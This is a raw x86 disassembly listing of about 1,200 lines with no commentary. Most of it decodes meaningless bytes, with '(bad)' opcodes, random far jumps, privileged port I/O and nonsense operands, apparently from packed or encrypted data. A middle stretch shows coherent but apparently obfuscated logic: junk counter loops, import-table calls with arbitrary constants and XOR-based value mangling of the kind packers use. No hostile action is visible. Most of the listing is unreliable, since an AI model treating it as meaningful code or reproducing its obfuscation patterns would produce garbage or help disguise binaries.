  409a01:	mov    ecx,0x62e55f19
  409a06:	stos   DWORD PTR es:[edi],eax
  409a07:	dec    ebp
  409a08:	adc    DWORD PTR [edx],ecx
  409a0a:	leave  
  409a0b:	das    
  409a0c:	(bad)  
  409a0d:	jae    0x4099aa
  409a0f:	xor    eax,0x3f978836
  409a14:	aaa    
  409a15:	int    0x1d
  409a17:	icebp  
  409a18:	push   ebp
  409a19:	xchg   edx,eax
  409a1a:	add    BYTE PTR [eax],0xd7
  409a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a1e:	add    dh,bl
  409a20:	jae    0x4099bf
  409a22:	cmp    BYTE PTR [ebx+0x18c7d003],al
  409a28:	popw   es
  409a2a:	sbb    ebp,DWORD PTR [edi]
  409a2c:	stos   BYTE PTR es:[edi],al
  409a2d:	daa    
  409a2e:	dec    ecx
  409a2f:	push   eax
  409a30:	cli    
  409a31:	fiadd  DWORD PTR [eax+eiz*2+0x1d]
  409a35:	xchg   edi,eax
  409a36:	push   cs
  409a37:	push   esp
  409a38:	bound  eax,QWORD PTR [eax]
  409a3a:	sahf   
  409a3b:	leave  
  409a3c:	mov    WORD PTR [esi+edx*8-0xb],es
  409a40:	out    0x43,al
  409a42:	mov    eax,ds:0x6d2c7fa6
  409a47:	icebp  
  409a48:	adc    BYTE PTR [eax+0x1],dl
  409a4b:	or     DWORD PTR [ebp+0x12],edi
  409a4e:	xor    DWORD PTR fs:[eax+0x6c],eax
  409a52:	mov    ds:0x4d316a9,al
  409a57:	sub    ebp,DWORD PTR [ecx]
  409a59:	xor    esi,DWORD PTR ds:0xf37fcb2d
  409a5f:	or     BYTE PTR [ebx],ch
  409a61:	push   esi
  409a62:	cmp    edx,edx
  409a64:	bound  esp,QWORD PTR [edi+0x5a654be9]
  409a6a:	(bad)  
  409a6c:	sub    eax,0xf9a9e6d4
  409a71:	(bad)  
  409a72:	(bad)  
  409a74:	and    dx,WORD PTR [edx-0x2d]
  409a78:	in     eax,dx
  409a79:	mov    ds:0x63c581e2,al
  409a7e:	ss inc ecx
  409a80:	retf   
  409a81:	cwde   
  409a82:	in     eax,dx
  409a83:	lock sbb esp,DWORD PTR [ecx-0x45]
  409a87:	int    0x2c
  409a89:	jg     0x409a68
  409a8b:	fld    QWORD PTR [eax]
  409a8d:	xchg   ebp,eax
  409a8e:	jmp    0x409add
  409a90:	inc    ebx
  409a91:	leave  
  409a92:	mov    ds:0x74c5d256,eax
  409a97:	aam    0xad
  409a99:	pop    ebp
  409a9a:	push   edi
  409a9b:	icebp  
  409a9c:	adc    ebp,DWORD PTR [ebx+0x6c]
  409a9f:	pop    ecx
  409aa0:	aas    
  409aa1:	mov    edi,0x757ccb16
  409aa6:	pop    eax
  409aa7:	xchg   DWORD PTR [ebx-0x3f],edi
  409aaa:	call   0xde7a467a
  409aaf:	push   eax
  409ab0:	icebp  
  409ab1:	push   eax
  409ab2:	das    
  409ab3:	mov    WORD PTR [edi],ss
  409ab5:	mov    esp,0xcbd7f4e3
  409aba:	inc    edi
  409abb:	aad    0xd7
  409abd:	outs   dx,DWORD PTR ds:[esi]
  409abe:	addr16 repz or al,0x89
  409ac2:	fs xchg esi,eax
  409ac4:	(bad)  
  409ac5:	ror    BYTE PTR [ebp-0x4b10e7b7],cl
  409acb:	scas   eax,DWORD PTR es:[edi]
  409acc:	jge    0x409aa4
  409ace:	mov    ch,0xd8
  409ad0:	xor    al,0xe9
  409ad2:	xor    al,0xee
  409ad4:	mov    al,0x10
  409ad6:	ss xor eax,0x2000198b
  409adc:	lods   eax,DWORD PTR ds:[esi]
  409add:	sahf   
  409ade:	enter  0xd0cb,0xe6
  409ae2:	xor    al,0x6a
  409ae4:	cmp    DWORD PTR [ebp+eiz*1+0x2a],esi
  409ae8:	adc    al,0xea
  409aea:	sbb    BYTE PTR [esi],ah
  409aec:	adc    BYTE PTR [ecx+0x21],dh
  409aef:	push   ds
  409af0:	mov    esi,0x81da1c31
  409af5:	repnz push 0xffffffee
  409af8:	sub    ebx,ebx
  409afa:	leave  
  409afb:	sbb    ah,bh
  409afd:	sub    DWORD PTR [edi+0x7a],ebp
  409b00:	ret    0xeba
  409b03:	pop    ds
  409b04:	cdq    
  409b05:	jle    0x409af2
  409b07:	xchg   edi,eax
  409b08:	nop
  409b09:	pop    edx
  409b0a:	mov    eax,DWORD PTR [eax+0x45]
  409b0d:	or     eax,0xea9af63a
  409b12:	dec    esp
  409b13:	jg     0x409b06
  409b15:	mov    BYTE PTR [ebx-0x6956a6c8],dl
  409b1b:	pusha  
  409b1c:	test   al,0x21
  409b1e:	and    BYTE PTR [ebx+0x35],ch
  409b21:	mov    al,ds:0xd1b03b11
  409b26:	push   eax
  409b27:	mov    bh,0x17
  409b29:	xor    bh,ah
  409b2b:	lahf   
  409b2c:	jno    0x409b9a
  409b2e:	xor    DWORD PTR [edx+0x21e680be],esi
  409b34:	ret    
  409b35:	dec    ebx
  409b36:	mov    esi,DWORD PTR [edx]
  409b38:	and    eax,0x261a33dd
  409b3d:	repnz pushf 
  409b3f:	jmp    0x5d85:0xa2bc2200
  409b46:	dec    esi
  409b47:	cmp    ebx,edx
  409b49:	js     0x409b1a
  409b4b:	xor    bh,BYTE PTR [edx+ebx*4+0x32fe6d2e]
  409b52:	(bad)  
  409b53:	adc    dh,BYTE PTR [esi]
  409b55:	pop    edx
  409b56:	sub    al,0x6a
  409b58:	add    al,0x19
  409b5a:	fs pop esp
  409b5c:	out    0xab,eax
  409b5e:	adc    ah,BYTE PTR [edi]
  409b60:	mov    eax,0x33e9db13
  409b65:	push   ebx
  409b66:	fidivr DWORD PTR [esi+ecx*2-0x24207017]
  409b6d:	sbb    eax,0xefe3ec2e
  409b72:	std    
  409b73:	bound  ebx,QWORD PTR [edi+0x312517fb]
  409b79:	out    dx,al
  409b7a:	in     al,0x1f
  409b7c:	das    
  409b7d:	xchg   edx,eax
  409b7e:	es retf 
  409b80:	dec    esi
  409b81:	xchg   BYTE PTR [eax+0x6c4b9e0d],bl
  409b87:	sbb    eax,0xa1201d80
  409b8c:	cmp    al,0x12
  409b8e:	arpl   WORD PTR [edx],di
  409b90:	inc    ebx
  409b91:	jmp    0x7630:0xf22c0be5
  409b98:	les    edx,FWORD PTR [edx]
  409b9a:	xor    DWORD PTR [edi-0x30f894a4],ecx
  409ba0:	sbb    DWORD PTR [eax+0x3],ecx
  409ba3:	mov    ch,0x80
  409ba5:	mov    esp,0x5bbae0bd
  409baa:	mov    edi,0xd721980d
  409baf:	call   0x1037a4f6
  409bb4:	sub    BYTE PTR [edx],0xb6
  409bb7:	pop    ds
  409bb8:	push   edi
  409bb9:	out    dx,al
  409bba:	mov    esp,0x47af9ab2
  409bbf:	pop    ebx
  409bc0:	icebp  
  409bc1:	add    al,0x61
  409bc3:	out    0xd2,eax
  409bc5:	xchg   esi,eax
  409bc6:	lods   al,BYTE PTR ds:[esi]
  409bc7:	mov    BYTE PTR [ebx-0x68],dh
  409bca:	add    dl,dh
  409bcc:	sahf   
  409bcd:	push   eax
  409bce:	(bad)  
  409bcf:	sub    dl,dh
  409bd1:	sub    DWORD PTR [ebp+0x1b],esp
  409bd4:	mov    ebx,0x358dba86
  409bd9:	and    DWORD PTR [edi+0x73a76377],ebp
  409bdf:	push   ecx
  409be0:	push   ds
  409be1:	cmp    BYTE PTR [ecx-0x32],dh
  409be4:	enter  0x3b5a,0x15
  409be8:	cmp    eax,0xd57d2cbd
  409bed:	add    edx,ebp
  409bef:	mov    bh,0xba
  409bf1:	leave  
  409bf2:	cmp    dl,BYTE PTR [ecx+0x4ac8432a]
  409bf8:	pop    ss
  409bf9:	mov    ch,0xfd
  409bfb:	(bad)  
  409bfd:	out    dx,al
  409bfe:	cld    
  409bff:	adc    eax,ebp
  409c01:	sbb    al,dl
  409c03:	inc    esi
  409c04:	ret    0x85cc
  409c07:	fcmovne st,st(2)
  409c09:	imul   ebp,edx,0xffffffce
  409c0c:	jnp    0x409c1c
  409c0e:	test   al,0x7d
  409c10:	out    dx,al
  409c11:	arpl   WORD PTR [ecx-0x676375b],cx
  409c17:	sub    DWORD PTR [ebx],0xffffffc4
  409c1a:	push   es
  409c1b:	gs mov dl,0x6c
  409c1e:	ins    BYTE PTR es:[edi],dx
  409c1f:	repnz sbb DWORD PTR [ecx],esp
  409c22:	sbb    dh,BYTE PTR [ebx]
  409c24:	and    esi,DWORD PTR [ebp-0x48]
  409c27:	push   ebp
  409c28:	and    al,0xeb
  409c2a:	ret    0x244
  409c2d:	nop
  409c2e:	xor    bh,dh
  409c30:	add    al,0x67
  409c32:	sub    DWORD PTR [ecx],esp
  409c34:	jle    0x409c30
  409c36:	xchg   esi,eax
  409c37:	mov    eax,0x34b20c34
  409c3c:	cmp    al,0x5c
  409c3e:	xchg   ebp,eax
  409c3f:	push   ss
  409c40:	mov    ds:0x9008195c,eax
  409c45:	(bad)  [esi]
  409c47:	lahf   
  409c48:	daa    
  409c49:	sub    eax,0xff7c1b39
  409c4e:	and    BYTE PTR [edx-0xf],dh
  409c51:	test   BYTE PTR [eax],ch
  409c53:	aad    0xf5
  409c55:	retf   
  409c56:	mov    dh,0xef
  409c58:	idiv   DWORD PTR [edi+0x7a5029db]
  409c5e:	in     al,dx
  409c5f:	or     BYTE PTR [edx+0x70],ah
  409c62:	sar    DWORD PTR [eax],cl
  409c64:	cmp    edx,DWORD PTR [ecx]
  409c66:	ja     0x409c46
  409c68:	xchg   ecx,eax
  409c69:	mov    al,0x67
  409c6b:	xor    ecx,DWORD PTR [eax+0x79]
  409c6e:	xchg   ebp,eax
  409c6f:	add    eax,esi
  409c71:	add    bl,BYTE PTR [ebp+ebp*8-0x14]
  409c75:	cld    
  409c76:	push   esp
  409c77:	les    eax,FWORD PTR [ebp-0x3c]
  409c7a:	jmp    0x186d:0xea7faa9b
  409c81:	test   dl,ah
  409c83:	aam    0xa1
  409c85:	ins    BYTE PTR es:[edi],dx
  409c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c87:	pop    ds
  409c88:	add    ah,BYTE PTR [edi-0x3c8877f2]
  409c8e:	bound  ebp,QWORD PTR [ebx-0x4e]
  409c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c92:	test   al,0x9c
  409c94:	out    dx,al
  409c95:	ret    0x1068
  409c98:	enter  0x9c67,0x73
  409c9c:	cmc    
  409c9d:	data16 int 0x5c
  409ca0:	retf   0x4bda
  409ca3:	popa   
  409ca4:	pushf  
  409ca5:	adc    bh,BYTE PTR [edx+0x292b1b22]
  409cab:	add    BYTE PTR [edi],dl
  409cad:	call   0x56ad:0xacab99a6
  409cb4:	and    ebp,DWORD PTR [ebx]
  409cb6:	push   ecx
  409cb7:	in     eax,dx
  409cb8:	ror    DWORD PTR [ebx-0x1d0594b],cl
  409cbe:	sub    al,0x58
  409cc0:	jb     0x409d0f
  409cc2:	mov    ah,0xac
  409cc4:	retf   0x2cee
  409cc7:	cmc    
  409cc8:	addr16 fyl2x 
  409ccb:	mov    ds:0xd12f936e,al
  409cd0:	or     eax,0xa22a15ba
  409cd5:	mov    DWORD PTR [ecx],eax
  409cd7:	stos   BYTE PTR es:[edi],al
  409cd8:	or     DWORD PTR [eax+0x31c9281c],edx
  409cde:	mov    ch,0x9d
  409ce0:	mov    BYTE PTR [edx],dh
  409ce2:	sti    
  409ce3:	hlt    
  409ce4:	addr16 jmp 0xe3db:0x58dffe9a
  409cec:	and    eax,0x2c971efd
  409cf1:	fstp   DWORD PTR [ebx]
  409cf3:	mov    ah,0xf4
  409cf5:	aaa    
  409cf6:	fsub   st(1),st
  409cf8:	lahf   
  409cf9:	out    dx,al
  409cfa:	in     al,0xdf
  409cfc:	cmp    ebp,DWORD PTR [edx+eiz*2]
  409cff:	sahf   
  409d00:	jle    0x409cac
  409d02:	retf   0x37a
  409d05:	mov    esi,0x18de758
  409d0a:	mov    ch,0xa2
  409d0c:	jne    0x409ce6
  409d0e:	popa   
  409d0f:	jge    0x409cff
  409d11:	ins    DWORD PTR es:[edi],dx
  409d12:	ror    dl,cl
  409d14:	xchg   BYTE PTR [ebp+0x39],dh
  409d17:	fld    DWORD PTR [ebp+0x3f]
  409d1a:	xor    ebp,DWORD PTR [ebp+0x5df7bb64]
  409d20:	ins    BYTE PTR es:[edi],dx
  409d21:	push   ds
  409d22:	out    dx,al
  409d23:	cmp    edi,eax
  409d25:	into   
  409d26:	arpl   WORD PTR [esp+edx*4+0xb],cx
  409d2a:	jl     0x409ce2
  409d2c:	cwde   
  409d2d:	jne    0x409cc4
  409d2f:	xchg   DWORD PTR ss:[eax],eax
  409d32:	(bad)  
  409d33:	and    eax,0x4c23c3cd
  409d38:	fld    DWORD PTR [eax-0x29]
  409d3b:	call   DWORD PTR [esi]
  409d3d:	xchg   edi,eax
  409d3e:	out    dx,eax
  409d3f:	xor    DWORD PTR [edi+ecx*4+0x14eb2fb],esp
  409d46:	into   
  409d47:	fidivr WORD PTR [edi]
  409d49:	jbe    0x409d9a
  409d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d4c:	inc    ebp
  409d4d:	retf   0xa145
  409d50:	push   es
  409d51:	mov    ebx,0x88630063
  409d56:	push   0x2367eb7f
  409d5b:	jns    0x409d49
  409d5d:	test   BYTE PTR [edi+0x9],bh
  409d60:	pop    ss
  409d61:	test   DWORD PTR [ebp+0x31],eax
  409d64:	sbb    al,0x5
  409d66:	ds xor al,0x78
  409d69:	xchg   edx,eax
  409d6a:	cld    
  409d6b:	inc    edx
  409d6c:	data16 jno 0x409d85
  409d6f:	cdq    
  409d70:	push   ss
  409d71:	test   BYTE PTR [edx],0x63
  409d74:	call   0xb4b6:0x94631a6a
  409d7b:	pop    esi
  409d7c:	ins    BYTE PTR es:[edi],dx
  409d7d:	jae    0x409dbd
  409d7f:	sahf   
  409d80:	hlt    
  409d81:	hlt    
  409d82:	adc    edx,ebx
  409d84:	shl    BYTE PTR ss:[edi-0x7934c8f1],cl
  409d8b:	mov    esp,0x97183dc5
  409d90:	test   DWORD PTR [ebx],ebx
  409d92:	fwait
  409d93:	dec    ebp
  409d94:	popa   
  409d95:	dec    eax
  409d96:	adc    BYTE PTR [esi-0x24],0x2d
  409d9a:	aam    0x6b
  409d9c:	in     eax,0x4f
  409d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d9f:	or     BYTE PTR ds:0x5ee4df96,dh
  409da5:	inc    DWORD PTR [edi-0x6b8de1c5]
  409dab:	jnp    0x409e10
  409dad:	cld    
  409dae:	ins    BYTE PTR es:[edi],dx
  409daf:	(bad)  
  409db0:	and    cl,bl
  409db2:	ins    DWORD PTR es:[edi],dx
  409db3:	xchg   BYTE PTR [edx],cl
  409db5:	ret    
  409db6:	mov    al,ds:0x38bbc752
  409dbb:	fcomp  QWORD PTR [ebp+0x736b4039]
  409dc1:	cmp    DWORD PTR [eax+0x3a],esi
  409dc4:	test   al,0xc4
  409dc6:	inc    esi
  409dc7:	lea    ebx,[ebp+0x6a]
  409dca:	retf   0x643d
  409dcd:	ins    DWORD PTR es:[edi],dx
  409dce:	dec    eax
  409dcf:	in     al,0x3e
  409dd1:	dec    edx
  409dd2:	fsubp  st(7),st
  409dd4:	xchg   esp,esi
  409dd6:	fs push ebx
  409dd8:	jo     0x409da2
  409dda:	xchg   ebx,eax
  409ddb:	sbb    al,0x6d
  409ddd:	std    
  409dde:	jno    0x409d71
  409de0:	push   ebp
  409de1:	enter  0xcc5a,0x81
  409de5:	or     DWORD PTR [edi],ebx
  409de7:	xchg   ebx,eax
  409de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409de9:	mov    ebp,DWORD PTR [eax-0x7b]
  409dec:	cmp    al,0xf2
  409dee:	jo     0x409e6e
  409df0:	bound  bp,DWORD PTR [ebx]
  409df3:	xchg   DWORD PTR [esi+eiz*8],ebx
  409df6:	jne    0x409dc7
  409df8:	mov    edx,0xf16e4da1
  409dfd:	jle    0x409dc6
  409dff:	cmp    al,0xad
  409e01:	shr    edi,0xed
  409e04:	or     DWORD PTR [edx],edx
  409e06:	mov    ch,0xb7
  409e08:	daa    
  409e09:	or     DWORD PTR [ebx-0x7b],esi
  409e0c:	xchg   DWORD PTR [esi+0x7445efd5],edx
  409e12:	ffree  st(7)
  409e14:	mov    bh,0xab
  409e16:	mov    al,0xdb
  409e18:	sbb    bl,BYTE PTR [ebx-0x4900e01b]
  409e1e:	and    eax,0xaf3fcd83
  409e23:	and    dl,BYTE PTR [edx-0x9]
  409e26:	add    bh,dl
  409e28:	pmovmskb eax,mm6
  409e2b:	pop    edi
  409e2c:	fwait
  409e2d:	dec    esi
  409e2e:	cmp    BYTE PTR [eax],0xfa
  409e31:	in     al,dx
  409e32:	mov    eax,ds:0x1e127719
  409e37:	xchg   ebx,eax
  409e38:	sub    eax,0x88d4ee21
  409e3d:	sahf   
  409e3e:	xchg   esp,eax
  409e3f:	adc    al,0x37
  409e41:	pop    ebp
  409e42:	inc    ebx
  409e43:	jno    0x409de1
  409e45:	in     al,0x25
  409e47:	mov    WORD PTR [eax-0xd],fs
  409e4a:	add    cl,al
  409e4c:	fstp   DWORD PTR [ecx-0x50]
  409e4f:	hlt    
  409e50:	and    al,BYTE PTR [ebp-0x61]
  409e53:	sahf   
  409e54:	adc    DWORD PTR [edi-0x45],ecx
  409e57:	outs   dx,DWORD PTR ds:[esi]
  409e58:	std    
  409e59:	sub    al,0xd5
  409e5b:	mov    ds:0xff4d24f9,eax
  409e60:	mov    ebx,0x653293e6
  409e65:	pop    ds
  409e66:	mov    WORD PTR [eax],ss
  409e68:	mov    al,0x67
  409e6a:	mov    edi,edi
  409e6c:	jo     0x409ecb
  409e6e:	cmp    BYTE PTR ds:0x82ee1fa1,bl
  409e74:	xor    ebp,DWORD PTR [ebx]
  409e76:	dec    esp
  409e77:	and    cl,BYTE PTR [ecx-0x7f]
  409e7a:	pop    ecx
  409e7b:	pop    ecx
  409e7c:	(bad)  
  409e7e:	jecxz  0x409ed0
  409e80:	test   BYTE PTR [ebx],cl
  409e82:	pop    es
  409e83:	in     eax,dx
  409e84:	mov    ebp,0x816f8a4d
  409e89:	mov    ah,0x84
  409e8b:	xchg   edi,eax
  409e8c:	xchg   DWORD PTR [edx+0x1f651e34],edi
  409e92:	fwait
  409e93:	call   0x6855:0x6eb88e8f
  409e9a:	or     BYTE PTR [ecx+0x306001a9],0x96
  409ea1:	jp     0x409ec8
  409ea3:	mov    dl,0xd2
  409ea5:	jae    0x409f0e
  409ea7:	call   FWORD PTR [esi+0x63]
  409eaa:	ficom  WORD PTR [edi]
  409eac:	inc    edi
  409ead:	or     eax,DWORD PTR [edi]
  409eaf:	fcomp  DWORD PTR [ecx-0x20]
  409eb2:	jp     0x409ed5
  409eb4:	clc    
  409eb5:	pop    edi
  409eb6:	adc    al,BYTE PTR [ebp-0x5]
  409eb9:	imul   ebx,DWORD PTR [esi+0x16b00dfb],0xcea3aa56
  409ec3:	or     ch,BYTE PTR [ebx-0x2c]
  409ec6:	in     al,0x97
  409ec8:	enter  0xacd4,0x38
  409ecc:	mov    al,ds:0x9a26942b
  409ed1:	aad    0x5c
  409ed3:	lods   eax,DWORD PTR ds:[esi]
  409ed4:	or     al,0x50
  409ed6:	(bad)  
  409ed7:	dec    edi
  409ed8:	icebp  
  409ed9:	xchg   BYTE PTR [ebx+0x8],ch
  409edc:	sbb    bh,ch
  409ede:	loope  0x409e78
  409ee0:	add    ecx,esi
  409ee2:	retf   
  409ee3:	mov    esi,0x39aadc31
  409ee8:	xlat   BYTE PTR ds:[ebx]
  409ee9:	or     BYTE PTR ds:0x8a8a825,0x4f
  409ef0:	xor    ch,BYTE PTR [esi-0x5ce1c5d2]
  409ef6:	rcl    ah,cl
  409ef8:	dec    BYTE PTR [ebp+eiz*8-0xac99fa1]
  409eff:	xchg   esi,eax
  409f00:	inc    esp
  409f01:	sub    dl,bh
  409f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f04:	lods   al,BYTE PTR ds:[esi]
  409f05:	push   ebp
  409f06:	cmp    edi,esp
  409f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f09:	xor    cl,BYTE PTR [eax]
  409f0b:	int    0x62
  409f0d:	in     al,0xe4
  409f0f:	jb     0x409f26
  409f11:	mov    DWORD PTR es:[ebp+0x652a16db],ebx
  409f18:	push   ebx
  409f19:	leave  
  409f1a:	cmp    eax,0x892dabd1
  409f1f:	stos   DWORD PTR es:[edi],eax
  409f20:	push   es
  409f21:	rcr    DWORD PTR [esi],1
  409f23:	cmp    bl,BYTE PTR [ecx+0x1d]
  409f26:	aas    
  409f27:	jecxz  0x409fa0
  409f29:	adc    eax,0x3249aef9
  409f2e:	stos   BYTE PTR es:[edi],al
  409f2f:	nop
  409f30:	dec    esp
  409f31:	hlt    
  409f32:	mov    ebp,0x469a99f2
  409f37:	mov    eax,ds:0x19dcbc03
  409f3c:	shl    DWORD PTR [ebx+0x62c34df7],1
  409f42:	mov    ch,0x48
  409f44:	sub    eax,DWORD PTR [edi+0x31cd57bb]
  409f4a:	ror    ebx,cl
  409f4c:	pushf  
  409f4d:	out    dx,eax
  409f4e:	(bad)
  409f53:	cmp    al,0x42
  409f55:	push   eax
  409f56:	mov    al,ds:0xbe63e61e
  409f5b:	mov    ds:0x160fa95b,al
  409f60:	test   BYTE PTR [ecx+0x106bd84b],cl
  409f66:	adc    DWORD PTR [ecx+0x2b],ecx
  409f69:	mov    bh,0x19
  409f6b:	and    eax,0xb87ea330
  409f70:	ret    
  409f71:	xchg   edx,edx
  409f73:	pop    ecx
  409f74:	scas   al,BYTE PTR es:[edi]
  409f75:	adc    DWORD PTR ds:0x8117024c,ebp
  409f7b:	push   ds
  409f7c:	push   ebx
  409f7d:	adc    BYTE PTR [ecx-0x3a],bl
  409f80:	jnp    0x409f0d
  409f82:	sbb    BYTE PTR [eax-0x7effffff],0x25
  409f89:	or     BYTE PTR [eax+0x42],dl
  409f8f:	add    BYTE PTR [eax],al
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a1fc
  40a251:	dec    ch
  40a253:	into   
  40a254:	rol    BYTE PTR ds:0x5f4e7c7c,1
  40a25a:	jl     0x40a2d8
  40a25c:	shl    ch,0xf6
  40a25f:	imul   edi,esi,0x54
  40a262:	hlt    
  40a263:	pop    ebx
  40a264:	aad    0x1c
  40a266:	fcom   DWORD PTR [eax-0x2ace340]
  40a26c:	out    0x9,al
  40a26e:	push   es
  40a26f:	fsubrp st(2),st
  40a271:	fnstenv [esi]
  40a273:	add    al,0x9b
  40a275:	bound  edx,QWORD PTR [edi+0x2e204f03]
  40a27b:	xor    DWORD PTR [edi],eax
  40a27d:	or     eax,0xa0b69763
  40a282:	pop    ecx
